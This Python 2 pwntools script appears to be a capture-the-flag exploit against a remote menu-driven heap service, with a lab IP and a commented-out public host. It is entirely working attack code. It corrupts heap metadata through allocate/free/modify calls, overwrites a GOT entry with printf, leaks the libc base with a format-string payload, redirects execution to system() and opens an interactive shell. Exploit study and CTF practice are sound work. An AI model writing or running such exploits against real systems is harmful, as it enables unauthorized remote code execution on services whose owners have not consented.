#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *

host = "10.211.55.6"
port = 9999
#host = "13.124.131.103"
#port = 31337
r = remote(host,port)

def secret(data):
    r.recvuntil(">")
    r.sendline(str(0x31337))
    r.recvuntil(":")
    r.sendline(str(0x53454355))
    r.recvuntil(":")
    r.sendline(data)

def alloca(size,data):
    r.recvuntil(">")
    r.sendline("1")
    r.recvuntil(":")
    r.sendline(str(size))
    r.recvuntil(":")
    r.sendline(data)

def free():
    r.recvuntil(">")
    r.sendline("2")

def modify(age,name,noage=False):
    r.recvuntil(">")
    r.sendline("3")
    r.recvuntil("?")
    if noage :
        r.sendline("n")
    else :
        r.sendline("y")
        r.recvuntil(":")
        r.sendline(str(age))
    r.recvuntil(":")
    r.sendline(name)
    r.recvuntil("?")
    r.sendline("y")

alloca(4095,"orange")
free()
modify(1,"da")
free()
modify(1,p64(0) + p64(0x6020c0-0x10))
alloca(4095,"ddaa")

modify(0,p64(0) + p64(0x6020c0-0x18)*2,True)
free()
r.recvuntil(">")
r.sendline(str(0x31337))
r.recvuntil(":")
r.sendline(str(0x211))
printf = 0x400756

alloca(0x200,"a"*8 + p64(0x602068-2))

modify(0,p64(printf) ,True)
r.recvuntil(">")
r.sendline("%3$p")
libc = int(r.recvuntil("\n").strip(),16) -0x00f69b0
print hex(libc)
r.recvuntil(">")
r.send("aaa")
system = libc + 0x45380
r.recvuntil("?")
r.sendline("n")
r.recvuntil(":")
r.sendline("\x00"*2 + p64(system))
r.recvuntil("?")
r.sendline("y")
r.recvuntil(">")
r.sendline("sh")
r.interactive()
